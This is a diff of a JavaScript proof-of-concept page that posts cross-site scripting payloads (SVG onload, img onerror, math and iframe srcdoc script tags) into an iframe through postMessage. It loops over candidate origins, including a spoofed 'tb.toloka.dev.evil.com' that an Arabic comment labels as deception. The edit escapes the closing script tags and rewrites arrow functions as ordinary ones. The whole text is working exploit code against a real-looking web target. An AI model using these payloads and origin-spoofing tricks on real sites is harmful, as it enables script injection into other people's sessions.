@@ -14,8 +14,8 @@
     const payloads = [
       `<svg onload=alert('XSS_SVG_BYPASS')>`, // Bypass 1: SVG tag
       `<img src=x onerror=alert('XSS_IMG')>`, // Bypass 2: onerror
-      `<math><script>alert('XSS_MATH')</script></math>`, // Bypass 3: Math tag
-      `<iframe srcdoc="<script>alert('XSS_IFRAME')</script>">` // Bypass 4: iframe.srcdoc
+      `<math><script>alert('XSS_MATH')<\/script></math>`, // Bypass 3: Math tag (تم إضافة escape لـ / في script)
+      `<iframe srcdoc="<script>alert('XSS_IFRAME')<\/script>">` // Bypass 4: iframe.srcdoc (تم إضافة escape لـ / في script)
     ];
 
     const originsToTry = [
@@ -26,10 +26,10 @@
       "https://tb.toloka.dev.evil.com",    // خداع
     ];
 
-    window.onload = () => {
-      setTimeout(() => {
-        originsToTry.forEach((origin) => {
-          payloads.forEach((xss) => {
+    window.onload = function() {
+      setTimeout(function() {
+        originsToTry.forEach(function(origin) {
+          payloads.forEach(function(xss) {
             const craftedMessage = {
               originalEvent: {
                 origin: origin
@@ -37,7 +37,7 @@
               data: xss
             };
 
-            console.log(`[📤] Sending to iframe... origin: ${origin} | payload: ${xss}`);
+            console.log("[📤] Sending to iframe... origin: " + origin + " | payload: " + xss);
             iframe.contentWindow.postMessage(craftedMessage, origin);
           });
         });
